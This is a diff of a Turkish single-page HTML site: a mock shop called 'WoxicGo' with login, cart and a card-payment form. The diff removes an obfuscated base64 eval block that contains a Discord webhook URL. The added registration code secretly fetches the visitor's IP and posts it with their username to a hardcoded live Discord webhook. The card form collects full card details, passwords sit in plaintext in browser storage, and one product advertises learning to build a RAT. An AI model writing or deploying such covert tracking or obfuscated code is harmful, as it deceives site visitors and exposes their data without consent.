@@ -2,41 +2,265 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<title>Hesap.com.tr</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>woxicbabapeek</title>
 <style>
-body{font-family:Arial,sans-serif;background:#f5f6fa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
-.container{background:#fff;padding:30px;border-radius:10px;box-shadow:0 10px 20px rgba(0,0,0,0.1);width:350px;text-align:center;}
-h2{margin-bottom:20px;color:#2f3640;}
-input[type=text],input[type=password]{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;}
-button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:5px;background:#0097e6;color:#fff;cursor:pointer;}
-button:hover{background:#40739e;}
-.info{margin-top:15px;color:green;}
-a{color:#0097e6;text-decoration:none;display:block;margin-top:10px;}
-a:hover{text-decoration:underline;}
-#dashboard{display:none;}
-.list-item{background:#f1f2f6;padding:10px;margin:10px 0;border-radius:5px;text-align:left;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:"Poppins",sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;overflow-x:hidden;}
+.fade-in{animation:fadeIn 1s ease forwards;opacity:0;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(40px);}to{opacity:1;transform:translateY(0);}}
+
+/* Giriş/Kayıt */
+.login-screen{position:fixed;top:0;left:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;background:rgba(0,0,0,0.95);z-index:9999;}
+.login-box{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;backdrop-filter:blur(12px);text-align:center;width:300px;animation:fadeIn 1.5s ease forwards;}
+.login-box h2{margin-bottom:20px;}
+.login-box input{width:100%;padding:10px;margin:10px 0;border:none;border-radius:10px;outline:none;}
+.btn{padding:12px 25px;background:#00e6ff;border:none;border-radius:30px;font-size:16px;color:#000;cursor:pointer;transition:0.3s;margin-top:15px;}
+.btn:hover{transform:scale(1.1);box-shadow:0 0 15px #00e6ff;}
+.error{color:#ff5555;font-size:14px;margin-top:10px;}
+
+/* Navbar */
+header{position:fixed;top:0;left:0;width:100%;padding:15px 40px;display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.4);backdrop-filter:blur(10px);z-index:100;animation:slideDown 1s ease forwards;}
+@keyframes slideDown{from{transform:translateY(-100%);}to{transform:translateY(0);}}
+header h1{font-size:24px;letter-spacing:2px;}
+nav a{margin:0 15px;text-decoration:none;color:#fff;position:relative;transition:color 0.3s;}
+nav a::after{content:"";position:absolute;bottom:-5px;left:0;width:0;height:2px;background:#00e6ff;transition:width 0.3s;}
+nav a:hover::after{width:100%;}
+
+/* Hero */
+.hero{height:80vh;display:flex;justify-content:center;align-items:center;text-align:center;flex-direction:column;animation:fadeIn 2s ease forwards;}
+.hero h2{font-size:3rem;margin-bottom:20px;}
+.hero p{font-size:1.2rem;margin-bottom:30px;}
+
+/* Ürünler */
+.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:25px;padding:120px 50px;}
+.product{background:rgba(255,255,255,0.1);padding:20px;border-radius:20px;backdrop-filter:blur(12px);text-align:center;transform:translateY(50px);opacity:0;transition:0.7s;}
+.product.visible{transform:translateY(0);opacity:1;}
+.product img{width:100%;border-radius:15px;margin-bottom:15px;}
+.product h3{margin-bottom:10px;}
+.product p{font-size:0.9rem;margin-bottom:10px;}
+.product input{width:50px;padding:5px;border-radius:8px;border:none;outline:none;margin-bottom:10px;}
+
+/* Sepet */
+#cart{position:fixed;top:80px;right:20px;background:rgba(0,0,0,0.7);padding:15px;border-radius:15px;max-width:300px;display:none;}
+#cart h4{margin-bottom:10px;}
+#cart ul{list-style:none;max-height:200px;overflow-y:auto;padding:0;}
+#cart li{margin-bottom:5px;font-size:14px;display:flex;justify-content:space-between;}
+
+/* Footer */
+footer{text-align:center;padding:20px;background:rgba(0,0,0,0.5);font-size:14px;letter-spacing:1px;}
+
+/* Modal */
+.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:flex;justify-content:center;align-items:center;z-index:99999;display:none;}
+.modal-content{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;backdrop-filter:blur(12px);}
+.modal-content h2{margin-bottom:20px;}
+.modal-content input{width:80%;padding:10px;margin:10px 0;border:none;border-radius:10px;outline:none;}
+
+/* Sonuç modal animasyonları */
+#resultModal.success .modal-content{
+  border: 3px solid #0f0;
+  box-shadow: 0 0 20px #0f0;
+  animation: glow 1s ease infinite alternate;
+}
+#resultModal.fail .modal-content{
+  border: 3px solid #f00;
+  animation: shake 0.5s;
+}
+@keyframes glow{
+  from {box-shadow:0 0 10px #0f0;}
+  to {box-shadow:0 0 25px #0f0;}
+}
+@keyframes shake{
+  0%{transform:translateX(0);}
+  25%{transform:translateX(-5px);}
+  50%{transform:translateX(5px);}
+  75%{transform:translateX(-5px);}
+  100%{transform:translateX(0);}
+}
 </style>
 </head>
 <body>
-<div class="container" id="authContainer">
-<h2 id="formTitle">Giriş Yap</h2>
-<input type="text" id="username" placeholder="Kullanıcı Adı">
-<input type="password" id="password" placeholder="Şifre">
-<button id="authButton">Giriş Yap</button>
-<p class="info" id="infoText"></p>
-<a href="#" id="toggleLink">Kayıt Ol</a>
+
+<!-- Giriş/Kayıt -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h2>WoxicGo</h2>
+    <input type="text" id="username" placeholder="Kullanıcı Adı">
+    <input type="password" id="password" placeholder="Şifre">
+    <button class="btn" onclick="login()">Giriş</button>
+    <button class="btn" onclick="register()">Kayıt Ol</button>
+    <p class="error" id="errorMsg"></p>
+  </div>
 </div>
-<div class="container" id="dashboard">
-<h2>Hoşgeldin <span id="userNameDisplay"></span>!</h2>
-<h3>Random İlanlar</h3>
-<div id="adsContainer"></div>
-<button id="logoutBtn">Çıkış Yap</button>
+
+<!-- Navbar -->
+<header>
+  <h1>Woxic</h1>
+  <nav>
+    <a href="#">Ana Sayfa</a>
+    <a href="#">Ürünler</a>
+    <a href="#" onclick="showCart()">Sepet</a>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero fade-in">
+  <h2>🛒 WoxicGo</h2>
+  <p>Dolandırılma Garantili Alışveriş Deneyimi.</p>
+</section>
+
+<!-- Ürünler -->
+<section class="products" id="products"></section>
+
+<!-- Sepet -->
+<div id="cart">
+  <h4>Sepet</h4>
+  <ul id="cartItems"></ul>
+  <button class="btn" onclick="checkout()">Öde</button>
+  <button class="btn" onclick="hideCart()">Alışverişe Devam Et</button>
 </div>
+
+<!-- Ödeme Modal -->
+<div class="modal" id="paymentModal">
+  <div class="modal-content">
+    <h2>Ödeme Bilgileri</h2>
+    <input type="text" id="cardNumber" placeholder="Kart Numarası" maxlength="19">
+    <input type="text" id="expiryDate" placeholder="Son Kullanma Tarihi (MM/YY)" maxlength="5">
+    <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+    <input type="text" id="address" placeholder="Adres">
+    <button class="btn" onclick="processPayment()">Öde</button>
+  </div>
+</div>
+
+<!-- Ödeme Kontrol Modal -->
+<div class="modal" id="processingModal">
+  <div class="modal-content">
+    <h2>Ödeme Kontrol Ediliyor...</h2>
+    <p>Lütfen bekleyin...</p>
+  </div>
+</div>
+
+<!-- Başarı / Hata Modal -->
+<div class="modal" id="resultModal">
+  <div class="modal-content">
+    <h2 id="resultText"></h2>
+    <button class="btn" onclick="closeResult()">Tamam</button>
+  </div>
+</div>
+
+<footer>© 2025 Woxic | Tüm Hakları Saklıdır.</footer>
 
 <script>
-eval(atob("aWYobGV0JmwmIWxvY2FsU3RvcmFnZS5nZXRGaWxlKSBsb2NhbFN0b3JhZ2UuZGVmYXVsdD0ie30iO2xldCBpc1JlZ2lzdGVyPSBmYWxzZTtjb25zdCB3aWI9Imh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MTA1ODgxNDI5NTU3OTAzNjYvTDUtbUxHTnRMRFBwQ0RkNzBQZVVsMnJZeUN5UFp6ZzFZV0hWM0RaTldKaWhBZnhTQnJNNmVsMUZqSmxHTWJHa0ZVSUlSbiI7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImF1dGhCdXR0b24iKS5vbmNsaWNlPSBmdW5jdGlvbigpe2xldCB1PWZpbGwoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVzZXJuYW1lIikudmFsdWUucmV0cmltKCkscD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYXBpUGFzc3dvcmQiKS52YWx1ZS5yZXRyaW0oKTt2YXIgY3VycmVudFVzZXJzPWpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEltc3QoInVzZXJzIikpO2lmKCFpc1JlZ2lzdGVyKXtpZGVudGlmaWVyKHVzZXIscCkuY2hhdChjdXJyZW50VXNlcnMpO31lbHNle2lmKHV8fCBjdXJyZW50VXNlcnNbdV09cCkgeyBzaG93RGFzaGJvYXJkKHV8fCBjdXJyZW50VXNlcnNbdV0pO31lbHNlIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbmZvVGV4dCIpLmlubmVyVGV4dD0iS2Fsb2J1IGFkcmVzZSI7fX0pO3ZhciB0b2dnbGVPcHRpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRvZ2dsZUxpbmsiKTt0b2dnbGVPcHRpb25zLm9uY2xpY2s9ZnVuY3Rpb24oKXtpcyRSZWdpc3RlciA9ICFpc1JlZ2lzdGVyOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidG9nZ2xlTGluayIpLmJpbmRFeGVjdXRlZGhvb2soKTt9Oy8vQ2hhbmdlIGZvbnQgc2l0ZSB2aWV3IGZ1bmN0aW9ucw=="));
-</script>
+// Kullanıcı yönetimi ve webhook IP gönderme
+function register(){
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+  if(!user || !pass){document.getElementById("errorMsg").textContent = "Kullanıcı adı ve şifre girin!";return;}
 
+  let users = JSON.parse(localStorage.getItem("woxicUsers") || "{}");
+  if(users[user]){document.getElementById("errorMsg").textContent = "Kullanıcı zaten kayıtlı!";return;}
+
+  users[user] = pass;
+  localStorage.setItem("woxicUsers", JSON.stringify(users));
+  document.getElementById("errorMsg").style.color = "lightgreen";
+  document.getElementById("errorMsg").textContent = "Kayıt başarılı! Şimdi giriş yapabilirsiniz.";
+
+  // IP webhook
+  fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json())
+    .then(data=>{
+      const userIP = data.ip;
+      const webhookURL = "https://discord.com/api/webhooks/1407674331592527904/NSzHU7gKpWuZywBZ2yI-xbquRuFr76rj-r-zeAKaiTd6Wc-NmkvVLEL2cc7aI575cMi4"; 
+      fetch(webhookURL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`Yeni kullanıcı kayıt oldu!\nKullanıcı: ${user}\nIP: ${userIP}`})});
+    })
+    .catch(err=>console.log("IP alınamadı:", err));
+}
+
+function login(){
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+  let users = JSON.parse(localStorage.getItem("woxicUsers") || "{}");
+  if(users[user] && users[user]===pass){document.getElementById("loginScreen").style.display="none";}
+  else{document.getElementById("errorMsg").textContent="❌ Kullanıcı adı veya şifre yanlış!";}
+}
+
+// Ürünler JSON
+const productList = [
+  {name:"WoxicBabadanRATYapmayıÖğren",price:100,img:"https://webandcrafts.com/_next/image?url=https%3A%2F%2Fadmin.wac.co%2Fuploads%2FFeatures_Of_Python_1_f4ccd6d9f7.jpg&w=4500&q=90"},
+  {name:"BEN",price:150,img:"https://img-cdn.hltv.org/playerbodyshot/xS8BdP3xAilDkvTc4DETjG.png?ixlib=java-2.1.0&w=400&s=95d288864e396a7a9ac6bbef0c5ac4c0"},
+  {name:"KIZGINGÜLLERİSİKMİSİM",price:99999999999999999,img:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHf5oMxwymW12p0IgZIDUW3umumxtiex3d5Q&s"}
+];
+
+// Dinamik ürün render
+const productsEl = document.getElementById("products");
+productList.forEach((prod,index)=>{
+  const div = document.createElement("div");
+  div.className="product";
+  div.innerHTML=`
+    <img src="${prod.img}" alt="${prod.name}">
+    <h3>${prod.name}</h3>
+    <p>Fiyat: ${prod.price}₺</p>
+    <input type="number" min="1" value="1" id="qty${index}">
+    <button class="btn" onclick="addToCart('${prod.name}', parseInt(document.getElementById('qty${index}').value))">Sepete Ekle</button>
+  `;
+  productsEl.appendChild(div);
+});
+
+// Scroll animasyon
+const products = document.querySelectorAll('.product');
+window.addEventListener('scroll',()=>{
+  products.forEach(product=>{
+    const rect=product.getBoundingClientRect();
+    if(rect.top<window.innerHeight-50){product.classList.add('visible');}
+  });
+});
+
+// Sepet
+const cartItemsEl=document.getElementById("cartItems");
+let cart=[];
+function addToCart(product,qty){for(let i=0;i<qty;i++) cart.push(product); renderCart(); alert(product+" sepete eklendi! 🛒");}
+function renderCart(){cartItemsEl.innerHTML=""; cart.forEach((item,i)=>{const li=document.createElement("li"); li.textContent=item; const removeBtn=document.createElement("button"); removeBtn.textContent="X"; removeBtn.style.marginLeft="10px"; removeBtn.onclick=()=>{cart.splice(i,1);renderCart();}; li.appendChild(removeBtn); cartItemsEl.appendChild(li);});}
+function showCart(){document.getElementById("cart").style.display="block";}
+function hideCart(){document.getElementById("cart").style.display="none";}
+
+// Ödeme
+function checkout(){if(cart.length===0){alert("Sepet boş!");return;}document.getElementById("paymentModal").style.display="flex";}
+function processPayment(){
+  const cardNumber=cardNumberInput.value.replace(/\s/g,'');
+  const expiry=expiryInput.value;
+  const cvv=cvvInput.value;
+  const address=document.getElementById("address").value;
+  if(cardNumber.length!==16){alert("❌ Kart numarası eksik!"); return;}
+  if(!/^\d{2}\/\d{2}$/.test(expiry)){alert("❌ Son kullanım hatalı!"); return;}
+  if(cvv.length!==3){alert("❌ CVV eksik!"); return;}
+  if(address.trim()===""){alert("❌ Adres boş olamaz!"); return;}
+
+  document.getElementById("paymentModal").style.display="none";
+  document.getElementById("processingModal").style.display="flex";
+
+  setTimeout(()=>{
+    document.getElementById("processingModal").style.display="none";
+    const success=Math.random()<0.7;
+    const resultModal=document.getElementById("resultModal");
+    resultModal.classList.remove("success","fail");
+    if(success){resultModal.classList.add("success"); document.getElementById("resultText").textContent="✅ Ödeme Başarılı!"; cart=[]; renderCart();}
+    else{resultModal.classList.add("fail"); document.getElementById("resultText").textContent="❌ Ödeme Reddedildi! Bakiyeniz yetersiz.";}
+    resultModal.style.display="flex";
+  },2000+Math.random()*2000);
+}
+function closeResult(){document.getElementById("resultModal").style.display="none";}
+
+// Kart numarası formatlama
+const cardNumberInput=document.getElementById("cardNumber");
+cardNumberInput.addEventListener("input",e=>{let value=e.target.value.replace(/\D/g,''); if(value.length>16) value=value.slice(0,16); value=value.match(/.{1,4}/g)?.join(' ')||''; e.target.value=value;});
+
+// Son kullanma MM/YY
+const expiryInput=document.getElementById("expiryDate");
+expiryInput.addEventListener("input",e=>{let value=e.target.value.replace(/\D/g,''); if(value.length>4) value=value.slice(0,4); if(value.length>2) value=value.slice(0,2)+'/'+value.slice(2); e.target.value=value;});
+
+// CVV 3 hane
+const cvvInput=document.getElementById("cvv");
+cvvInput.addEventListener("input",e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,3);});
+</script>
 </body>
 </html>
